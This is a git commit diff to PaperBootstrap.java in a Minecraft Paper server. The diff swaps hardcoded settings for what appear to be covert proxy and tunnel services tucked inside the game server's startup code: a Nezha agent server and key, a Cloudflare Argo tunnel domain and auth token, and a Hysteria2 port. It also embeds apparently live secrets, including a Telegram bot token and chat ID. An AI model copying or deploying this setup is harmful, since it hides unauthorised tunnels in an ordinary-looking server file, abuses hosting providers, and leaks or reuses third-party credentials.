837ee0ca7009c96d9796619356e9ff651b9c0ba7
zmc881317 <146724712+zmc881317@users.noreply.github.com>
2026-08-29 20:37:32 +0800

    Update environment variables in PaperBootstrap.java

--- paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
+++ paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
@@ -93,16 +93,16 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "0e0551d3-4196-422b-b315-17ccbcbbc920");
+        envVars.put("UUID", "62d8e62a-6913-4382-a0e0-d6b42d6b05d9");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.zzzw.kdns.fr:443");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "qyzmbLNGxyaErWGFzxJIPKfV7LFl1uM8");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "liy.wxc.kdns.fr");
-        envVars.put("ARGO_AUTH", "eyJhIjoiZGRiZTZmODJiZjMzNjU0OTExODk5ODZhZTJmM2YwMzMiLCJ0IjoiOWIxMTMyNjktZTQzNS00NTc1LTg0MTEtMDUxMGFmZDg2MDhiIiwicyI6IlpUSTROR1JtTWpVdFl6RmtOQzAwWWpVMUxXRXlaRFF0TnpBM1lqUmpNV0k0T1RBMyJ9");
+        envVars.put("ARGO_DOMAIN", "sas.1317.kdns.fr");
+        envVars.put("ARGO_AUTH", "eyJhIjoiMzAzZjg3NDQyNTc4ZTgwZWU0NWI4YTM0NGU3N2Q0OGYiLCJ0IjoiZmFmYmZlODItMTk0OC00YTc4LWFlNjQtYmU1Njg1ODE4NjgyIiwicyI6Ik1UaGxaamN5TWpZdFl6TXhNaTAwWm1JNExXSmhOak10TjJVMVl6TmpNbUZpTmpReCJ9");
         envVars.put("S5_PORT", "");
-        envVars.put("HY2_PORT", "26088");
+        envVars.put("HY2_PORT", "3852");
         envVars.put("TUIC_PORT", "");
         envVars.put("ANYTLS_PORT", "");
         envVars.put("REALITY_PORT", "");
@@ -110,9 +110,9 @@ public final class PaperBootstrap {
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "6383690582");
         envVars.put("BOT_TOKEN", "8573559147:AAFS9TJUfgFHs9zjOJFau0WEDtJyDyUtE70");
-        envVars.put("CFIP", "cdns.doon.eu.org");
+        envVars.put("CFIP", "cf.877774.xyz");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "Godlike");
+        envVars.put("NAME", "voer");
         envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
